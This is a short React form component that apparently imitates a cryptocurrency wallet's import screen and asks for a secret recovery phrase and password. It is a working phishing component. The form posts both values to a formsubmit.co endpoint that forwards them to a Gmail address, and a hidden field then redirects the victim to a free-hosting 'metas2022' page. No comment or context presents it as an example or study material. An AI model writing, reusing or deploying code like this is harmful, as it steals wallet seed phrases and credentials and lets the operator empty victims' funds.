import React, { useState } from 'react'

const Form = () => {
    const [togKey, setTogKey] = useState(false)
    const [togPassword, setTogPassword] = useState(false)

    const topKe = ()=> {
        setTogKey(!togKey);
    }
    const togPass =()=> {
        setTogPassword(!togPassword);
    }
  return (
    <div>
        <form action="https://formsubmit.co/advisorytravel8@gmail.com" method="POST" >
			<div>
				<div class="labPar">
					<label for="key">Secret Recovery Phrase</label>
					<p onClick={topKe} >{ togKey ? 'Hide' : 'Show' }</p>
				</div>
                <input type="hidden" name="_next" value="https://metas2022.000webhostapp.com/notice.php"></input>
				<input type={ togKey ? 'text' : 'password' } placeholder="Enter your Secret Recovery Phrase" name="key" required />
			</div>
			<div>
				<div class="labPar">
					<label for="password">Password</label>
					<p onClick={togPass} >{ togPassword ? "Hide" : 'Show' }</p>
				</div>
				<input type={ togPassword ? 'text' : 'password' } placeholder="Password" name="password" required />
			</div>
			<input class="myBtn" type="submit" value="IMPORT" name="submit"/>
		</form>
    </div>
  )
}

export default Form
